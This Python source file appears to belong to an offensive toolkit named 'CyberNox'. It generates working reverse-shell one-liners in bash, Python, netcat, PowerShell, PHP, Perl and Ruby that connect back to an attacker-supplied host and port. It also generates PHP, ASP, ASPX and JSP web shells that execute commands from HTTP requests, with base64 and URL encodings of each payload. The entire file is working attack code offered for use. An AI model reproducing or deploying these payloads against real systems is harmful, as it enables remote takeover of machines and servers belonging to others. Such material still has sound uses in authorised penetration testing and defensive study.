
"""
Exploit and payload generation module for CyberNox
"""

import base64
import urllib.parse
from utils.logger import logger
from utils.config import config

class ExploitModule:
    """Exploit and payload generation"""
    
    def __init__(self):
        self.timeout = config.get('exploit.reverse_shell_timeout', 30)
    
    def generate_reverse_shell(self, shell_type, lhost, lport):
        """Generate reverse shell payloads"""
        logger.info(f"Generating {shell_type} reverse shell payload for {lhost}:{lport}")
        
        payloads = {
            'bash': self._generate_bash_shell(lhost, lport),
            'python': self._generate_python_shell(lhost, lport),
            'python3': self._generate_python3_shell(lhost, lport),
            'nc': self._generate_netcat_shell(lhost, lport),
            'powershell': self._generate_powershell_shell(lhost, lport),
            'php': self._generate_php_shell(lhost, lport),
            'perl': self._generate_perl_shell(lhost, lport),
            'ruby': self._generate_ruby_shell(lhost, lport)
        }
        
        if shell_type.lower() in payloads:
            payload = payloads[shell_type.lower()]
            logger.info(f"Generated {shell_type} reverse shell payload")
            return {
                "type": shell_type,
                "lhost": lhost,
                "lport": lport,
                "payload": payload,
                "encoded": {
                    "base64": base64.b64encode(payload.encode()).decode(),
                    "url": urllib.parse.quote(payload)
                }
            }
        else:
            error_msg = f"Shell type '{shell_type}' not supported"
            logger.error(error_msg)
            return {"error": error_msg}
    
    def _generate_bash_shell(self, lhost, lport):
        """Generate bash reverse shell"""
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    def _generate_python_shell(self, lhost, lport):
        """Generate Python reverse shell"""
        return (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"import pty;pty.spawn(\"/bin/bash\")'"
        )
    
    def _generate_python3_shell(self, lhost, lport):
        """Generate Python3 reverse shell"""
        return (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"import pty;pty.spawn(\"/bin/bash\")'"
        )
    
    def _generate_netcat_shell(self, lhost, lport):
        """Generate Netcat reverse shell"""
        return f"nc -e /bin/sh {lhost} {lport}"
    
    def _generate_powershell_shell(self, lhost, lport):
        """Generate PowerShell reverse shell"""
        payload = f"""
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
        """.strip().replace('\n', ';')
        
        return f"powershell -nop -c \"{payload}\""
    
    def _generate_php_shell(self, lhost, lport):
        """Generate PHP reverse shell"""
        return (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        )
    
    def _generate_perl_shell(self, lhost, lport):
        """Generate Perl reverse shell"""
        return (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        )
    
    def _generate_ruby_shell(self, lhost, lport):
        """Generate Ruby reverse shell"""
        return (
            f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        )
    
    def generate_web_shell(self, shell_type='php'):
        """Generate web shell payloads"""
        logger.info(f"Generating {shell_type} web shell")
        
        if shell_type.lower() == 'php':
            payload = "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>"
        elif shell_type.lower() == 'asp':
            payload = "<%eval request(\"cmd\")%>"
        elif shell_type.lower() == 'aspx':
            payload = '<%@ Page Language="C#" Debug="true" Trace="false" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<%@ Import Namespace="System.IO" %>\n<script Language="c#" runat="server">\nvoid Page_Load(object sender, EventArgs e)\n{\n}\nstring ExcuteCmd(string arg)\n{\nProcessStartInfo psi = new ProcessStartInfo();\npsi.FileName = "cmd.exe";\npsi.Arguments = "/c "+arg;\npsi.RedirectStandardOutput = true;\npsi.UseShellExecute = false;\nProcess p = Process.Start(psi);\nStreamReader stmrdr = p.StandardOutput;\nstring s = stmrdr.ReadToEnd();\nstmrdr.Close();\nreturn s;\n}\nvoid cmdExe_Click(object sender, System.EventArgs e)\n{\nResponse.Write("<pre>");\nResponse.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));\nResponse.Write("</pre>");\n}\n</script>\n<HTML>\n<body>\n<form id="cmd" method="post" runat="server">\n<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>\n<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>\n<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>\n</form>\n</body>\n</HTML>'
        elif shell_type.lower() == 'jsp':
            payload = "<%@ page import=\"java.util.*,java.io.*\"%>\n<%\nif (request.getParameter(\"cmd\") != null) {\nout.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\nProcess p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\nOutputStream os = p.getOutputStream();\nInputStream in = p.getInputStream();\nDataInputStream dis = new DataInputStream(in);\nString disr = dis.readLine();\nwhile ( disr != null ) {\nout.println(disr);\ndisr = dis.readLine();\n}\n}\n%>"
        else:
            return {"error": f"Web shell type '{shell_type}' not supported"}
        
        return {
            "type": shell_type,
            "payload": payload,
            "encoded": {
                "base64": base64.b64encode(payload.encode()).decode(),
                "url": urllib.parse.quote(payload)
            }
        }

# Legacy function for backward compatibility
def generate_reverse_shell(shell_type, lhost, lport):
    """Legacy function wrapper"""
    exploit = ExploitModule()
    result = exploit.generate_reverse_shell(shell_type, lhost, lport)
    if "error" in result:
        return result["error"]
    return result["payload"]
